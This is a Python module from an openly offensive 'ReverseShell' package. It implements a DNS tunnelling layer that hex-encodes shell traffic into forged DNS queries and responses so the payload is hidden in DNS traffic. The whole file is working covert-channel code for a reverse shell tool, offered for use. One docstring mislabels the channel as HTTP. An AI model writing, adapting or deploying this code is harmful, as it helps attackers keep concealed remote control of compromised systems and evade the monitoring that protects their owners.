#!/usr/bin/env python3
# -*- coding: utf-8 -*-

###################
#    This package implements an advanced reverse shell console.
#    Copyright (C) 2023  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

"""
This package implements an advanced reverse shell
console (supports: TCP, UDP, IRC, HTTP and DNS).
"""

__version__ = "0.0.1"
__author__ = "Maurice Lambert"
__author_email__ = "mauricelambert434@gmail.com"
__maintainer__ = "Maurice Lambert"
__maintainer_email__ = "mauricelambert434@gmail.com"
__description__ = """
This package implements an advanced reverse shell
console (supports: TCP, UDP, IRC, HTTP and DNS).
"""
license = "GPL-3.0 License"
__url__ = "https://github.com/mauricelambert/ReverseShell"

copyright = """
ReverseShell  Copyright (C) 2023  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.
"""
__license__ = license
__copyright__ = copyright

__all__ = ["DNS"]

from base64 import b16decode, b16encode
from random import randint

from .base import ApplicationBaseClass


class DNS(ApplicationBaseClass):
    """
    This class parses and writes DNS request and response.
    """

    def __init__(self):
        self.dns_id = b"\x33\x66"

    initialization_response = initialization_request = lambda *x: None

    def parse(self, data: bytes) -> bytes:
        """
        This method parses DNS query and response.
        """

        self.dns_id = data[:2]

        query = data[12:].split(b"\x00")[0]
        data = bytearray()

        while query:
            length = query[0] + 1
            data += b16decode(query[1:length])
            query = query[length:]

        return data

    parse_request = parse
    parse_response = parse

    def wrap_response(self, data: bytes, is_encrypted: bool = False) -> bytes:
        """
        This method writes data in DNS response to
        hide ReverseShell payload in DNS traffic.
        """

        return (
            self.dns_id
            + b"\x80\x00\x00\x01\x00\x01\x00\x00\x00\x00"
            + self.add_data(data)
            + b"\x00\x00\x01\x00\x01\xc0\x0c\x00\x01\x00\x01"
            + randint(0, 4294967295).to_bytes(4, "big")
            + b"\x00\x04"
            + randint(0, 4294967295).to_bytes(4, "big")
        )

    @staticmethod
    def add_data(data: bytes) -> bytes:
        """
        This method add data in DNS query.
        """

        encoded = bytearray()
        first = data[:5]
        encoded.append(len(first) * 2)
        encoded += b16encode(first)
        data = data[5:]

        while len(data) > 50:
            length = randint(10, 50)
            encoded += (length * 2).to_bytes(1) + b16encode(data[:length])
            data = data[length:]

        if data:
            encoded += (len(data) * 2).to_bytes(
                1, byteorder="big"
            ) + b16encode(data)

        return encoded

    def wrap_request(self, data: bytes, is_encrypted: bool = False) -> bytes:
        """
        This method writes data in DNS query to hide
        ReverseShell response in HTTP traffic.
        """

        self.dns_id = randint(0, 65535).to_bytes(2, byteorder="big")

        return (
            self.dns_id
            + (0b0000000100000000).to_bytes(2, byteorder="big")
            + (1).to_bytes(2, byteorder="big")
            + (0).to_bytes(2, byteorder="big")
            + (0).to_bytes(2, byteorder="big")
            + (0).to_bytes(2, byteorder="big")
            + self.add_data(data)
            + b"\x00\x00\x01\x00\x01"
        )
